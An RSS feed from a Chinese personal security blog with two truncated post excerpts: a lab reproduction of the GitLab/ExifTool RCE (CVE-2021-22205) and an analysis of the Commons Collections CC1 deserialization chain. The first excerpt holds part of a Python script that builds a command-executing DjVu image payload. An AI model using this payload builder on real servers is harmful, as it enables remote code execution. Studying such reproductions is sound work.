<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>web on Tigger的个人博客</title>
    <link>/categories/web/</link>
    <description>Recent content in web on Tigger的个人博客</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>&amp;copy; 2021 &lt;a href=&#34;http://www.cnaloha.com/&#34;&gt;Tigger&lt;/a&gt;
</copyright>
    <lastBuildDate>Sun, 17 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/categories/web/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2021-22205 复现</title>
      <link>/posts/22205/</link>
      <pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/22205/</guid>
      <description>CVE-2021-22205 是GitLab在4月份爆出的RCE，实际上是依托于CVE-2021-22204，也就是ExifTool的命令执行。而GitLab刚好上次hw的时候碰到过，虽然当时的对方gitlab版本比较高没有利用成功，但当时看的时候比较有意思，这里重新复现一下。
一、漏洞原理 Gitlab 是使用Ruby与Go编写的git软件，而CVE-2021-22205的漏洞原理可以参见
https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
https://hackerone.com/reports/1154542
简单说明：
 当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。 ExifTool，它是一个使用perl编写的用于解析、操作图片文件中Tags信息的工具。tags就是时间、日期、地理位置等存在于图片格式中的信息。https://segmentfault.com/a/1190000018032048 而Gitlab 利用ExifTool来删除图片的tags信息。 但是ExifTool在处理DjVu模块的时候，可以使用构造的数据绕过正则过滤，导致perl命令执行。  二、复现 这里使用vulfocus靶场，注意在启动靶场后由于比较慢，所以需要过几分钟才不会出现拒绝访问和502。
进去之后修改密码，使用root账户登录。找到上传点：
使用原作者的echo_vakzz.jpg完成漏洞验证：
修改执行的命令：
三、命令执行图片构造： 利用原JPG构造符合格式的命令执行的图片即可：
EXP和POC在github上有许多，这里就不重复造轮子了，简单写一个自己的用来生成执行命令的图片的python脚本：
import base64 import sys def getPayload(command): payload = b&#39;&#39; payload += b&#39;\x41\x54\x26\x54\x46\x4F\x52\x4D\x00\x00\x03\xAF\x44\x4A&#39; payload += b&#39;\x56\x4D\x44\x49\x52\x4D\x00\x00\x00\x2E\x81\x00\x02\x00&#39; payload += b&#39;\x00\x00\x46\x00\x00\x00\xAC\xFF\xFF\xDE\xBF\x99\x20\x21&#39; payload += b&#39;\xC8\x91\x4E\xEB\x0C\x07\x1F\xD2\xDA\x88\xE8\x6B\xE6\x44&#39; payload += b&#39;\x0F\x2C\x71\x02\xEE\x49\xD3\x6E\x95\xBD\xA2\xC3\x22\x3F&#39; payload += b&#39;\x46\x4F\x52\x4D\x00\x00\x00\x5E\x44\x4A\x56\x55\x49\x4E&#39; payload += b&#39;\x46\x4F\x00\x00\x00\x0A\x00\x08\x00\x08\x18\x00\x64\x00&#39; payload += b&#39;\x16\x00\x49\x4E\x43\x4C\x00\x00\x00\x0F\x73\x68\x61\x72&#39; payload += b&#39;\x65\x64\x5F\x61\x6E\x6E\x6F\x2E\x69\x66\x66\x00\x42\x47&#39; payload += b&#39;\x34\x34\x00\x00\x00\x11\x00\x4A\x01\x02\x00\x08\x00\x08&#39; payload += b&#39;\x8A\xE6\xE1\xB1\x37\xD9\x7F\x2A\x89\x00\x42\x47\x34\x34&#39; payload += b&#39;\x00\x00\x00\x04\x01\x0F\xF9\x9F\x42\x47\x34\x34\x00\x00&#39; payload += b&#39;\x00\x02\x02\x0A\x46\x4F\x52\x4D\x00\x00\x03\x07\x44\x4A&#39; payload += b&#39;\x56\x49\x41\x4E\x54\x61\x00\x00\x01\x50\x28\x6D\x65\x74&#39; payload += b&#39;\x61\x64\x61\x74\x61\x0A\x09\x28\x43\x6F\x70\x79\x72\x69&#39; payload += b&#39;\x67\x68\x74\x20\x22\x5C\x0A\x22\x20\x2E\x20\x71\x78\x7B&#39; payload += b&#39;echo\x20&#39;+base64.</description>
    </item>
    
    <item>
      <title>CC1利用链分析</title>
      <link>/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</link>
      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</guid>
      <description>Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection(集合)相关类对象。
在该组件中有一个Transformer接口，实现了该接口的类有 ConstantTransformer、invokerTransformer、ChainedTransformer、TransformedMap等等
一、复现环境 环境：
maven依赖
&amp;lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;3.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt;  二、分析 ConstantTransformer类 该类是对Transformer类的实现。
可以看到该类重写了transform方法，并且调用了Closure.execute方法，并且返回一个对象。
简单来说，如果实例化ConstantTransformer对象的时候传入的是A类实例，那么我们调用该对象的transform对象的时候就会返回A类的实例。
也就是它的作用是对对象进行了输入输出的转化。
public class ClosureTransformer implements Transformer, Serializable { private static final long serialVersionUID = 478466901448617286L; private final Closure iClosure; public static Transformer getInstance(Closure closure) { if (closure == null) { throw new IllegalArgumentException(&amp;quot;Closure must not be null&amp;quot;); } else { return new ClosureTransformer(closure); } } public ClosureTransformer(Closure closure) { this.iClosure = closure; } public Object transform(Object input) { this.</description>
    </item>
    
  </channel>
</rss>
